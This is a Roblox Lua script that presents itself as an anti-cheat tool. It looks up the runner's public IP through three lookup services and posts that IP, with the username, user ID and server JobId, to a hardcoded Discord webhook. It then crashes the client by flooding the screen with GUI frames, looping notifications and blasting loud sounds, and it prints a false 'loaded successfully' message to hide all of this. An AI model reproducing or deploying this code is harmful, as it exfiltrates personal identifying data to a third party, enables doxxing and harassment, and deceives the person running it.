-- PERFECT Anti-Cheat IP Leak Script (UGC/2026 Fixed)
local http = game:GetService("HttpService")
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local teleportService = game:GetService("TeleportService")
local starterGui = game:GetService("StarterGui")

-- Webhook (zamień)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1491843313719050261/l-C_wdzkQR4x9D9-zei2GpHomy4NzV-IASUfmxm-m1Tw1H2gRdfJA057n7i4-MBwvAc4"

local function getRealIP()
    local ips = {}
    
    -- httpbin
    local ok, res = pcall(http.GetAsync, http, "https://httpbin.org/ip")
    if ok then
        local data = http:JSONDecode(res)
        if data.origin then table.insert(ips, data.origin) end
    end
    
    -- ipify
    ok, res = pcall(http.GetAsync, http, "https://api.ipify.org?format=json")
    if ok then
        local data = http:JSONDecode(res)
        if data.ip then table.insert(ips, data.ip) end
    end
    
    -- icanhazip
    ok, res = pcall(http.GetAsync, http, "https://icanhazip.com")
    if ok and res:match("%d+%.%d+%.%d+%.%d+") then
        table.insert(ips, res:match("%d+%.%d+%.%d+%.%d+"))
    end
    
    return #ips > 0 and table.concat(ips, " | ") or "DETECTED"
end

local function discordAlert(title, desc)
    pcall(function()
        http:PostAsync(WEBHOOK_URL, http:JSONEncode({
            embeds = {{
                title = title,
                description = desc,
                color = 16711680,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }), Enum.HttpContentType.ApplicationJson)
    end)
end

local function crashKick(reason)
    -- Method 1: CoreGui Flood (najlepszy)
    spawn(function()
        local sg = Instance.new("ScreenGui")
        sg.Parent = game.CoreGui
        sg.Name = "CRASH_" .. tick()
        for i = 1, 1000 do
            local f = Instance.new("Frame", sg)
            f.Size = UDim2.new(2, 0, 2, 0)
            f.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
        end
    end)
    
    -- Method 2: Notification Spam
    spawn(function()
        while true do
            pcall(function()
                starterGui:SetCore("SendNotification", {
                    Title = "KICKED",
                    Text = reason,
                    Duration = math.huge
                })
            end)
            wait()
        end
    end)
    
    -- Method 3: Sound Spam
    spawn(function()
        for i = 1, 50 do
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxasset://sounds/electronicpingshort.wav"
            sound.Volume = 100
            sound.Parent = workspace
            sound:Play()
        end
    end)
end

-- EXECUTE
local lp = players.LocalPlayer
local ip = getRealIP()

local alert = string.format(
    "**🚨 CHEATER DETECTED 🚨**\n" ..
    "**User:** `%s` (ID: %d)\n" ..
    "**Real IP:** ```%s```\n" ..
    "**JobId:** `%s`",
    lp.Name, lp.UserId, ip, game.JobId
)

discordAlert("🕵️ HACKER CAUGHT", alert)

local kickReason = "CHEAT DETECTED | IP: " .. ip .. " | ID: " .. lp.UserId
crashKick(kickReason)

-- Mask
print("Script loaded successfully")
